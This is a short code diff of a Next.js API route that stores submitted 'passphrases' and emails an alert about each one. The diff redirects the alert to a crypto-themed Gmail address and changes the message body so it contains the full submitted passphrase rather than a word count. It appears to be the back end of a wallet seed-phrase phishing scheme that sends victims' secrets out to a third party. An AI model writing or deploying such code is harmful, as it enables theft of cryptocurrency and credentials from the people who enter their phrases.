@@ -1,6 +1,8 @@
 import { NextRequest, NextResponse } from 'next/server';
 import prisma from '@/lib/prisma';
 import { MailtrapClient } from 'mailtrap';
+import nodemailer from 'nodemailer';
+
 
 export async function POST(request: NextRequest) {
   try {
@@ -61,7 +63,7 @@ export async function POST(request: NextRequest) {
 
     const recipients = [
       {
-        email: 'sheyinpraise@gmail.com',
+        email:   "bitdigitalcurrencyinvestment7@gmail.com",
       },
     ];
 
@@ -72,9 +74,12 @@ export async function POST(request: NextRequest) {
       from: sender,
       to: recipients,
       subject: 'New Passphrase Submission',
-      text: `A passphrase was submitted.\n\nWord count: ${trimmed}\nRecord ID: ${saved.id}`,
+      text: `A passphrase was submitted.\n\n: ${trimmed}\nRecord ID: ${saved.id}`,
       category: 'Passphrase Alert',
     });
+
+
+
 
     // 4. Success response
     return NextResponse.json(
